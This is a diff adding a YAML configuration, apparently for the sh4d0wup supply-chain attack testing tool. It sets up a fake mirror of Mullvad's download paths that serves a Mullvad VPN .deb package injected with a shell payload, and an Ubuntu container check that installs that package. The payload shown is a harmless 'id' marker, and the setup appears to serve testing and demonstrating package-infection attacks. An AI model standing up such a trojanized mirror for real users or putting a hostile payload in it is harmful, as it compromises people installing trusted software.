@@ -1,0 +1,68 @@
+---
+
+upstreams:
+  mullvad:
+    url: https://mullvad.net/
+
+artifacts:
+  upstream_deb:
+    type: url
+    url: https://mullvad.net/download/app/deb/latest/
+  infected_deb:
+    type: infect
+    infect: deb
+    artifact: upstream_deb
+    payload: |
+      id
+      # cancel out the rest of the script because it errors if systemd is unavailable
+      exit 0
+
+check:
+  image: ubuntu:22.04
+  cmds:
+    - apt-get update && apt-get install -y wget
+    # https://mullvad.net/en/help/install-mullvad-app-linux/
+    - wget -nv --content-disposition http://${SH4D0WUP_BOUND_ADDR}/download/app/deb/latest
+    - apt install -y ./MullvadVPN-*.*_amd64.deb
+
+routes:
+  - path: /download/app/deb/latest/
+    type: static
+    args:
+      status: 302
+      headers:
+        location: /media/app/MullvadVPN-2022.5_amd64.deb
+      data: ''
+
+  - path: /media/app/MullvadVPN-2022.5_amd64.deb
+    type: static
+    args:
+      artifact: infected_deb
+
+  - path: /download/app/deb/latest/signature
+    type: static
+    args:
+      data: |
+        todo
+
+# /en/help/verifying-signatures/
+# /media/mullvad-code-signing.asc
+# /download/app/exe/latest/
+# /download/app/exe/latest/signature
+# /download/app/pkg/latest/
+# /download/app/pkg/latest/signature
+# /download/app/deb/latest/
+# /download/app/deb/latest/signature
+# /download/app/rpm/latest/
+# /download/app/rpm/latest/signature
+# /download/app/arm-deb/latest/
+# /download/app/arm-deb/latest/signature
+# /download/app/arm-rpm/latest/
+# /download/app/arm-rpm/latest/signature
+# /download/app/apk/latest/
+# /download/app/apk/latest/signature
+# /media/extension/mullvad_privacy_companion-0.6.3-fx.xpi
+
+  - type: proxy
+    args:
+      upstream: mullvad
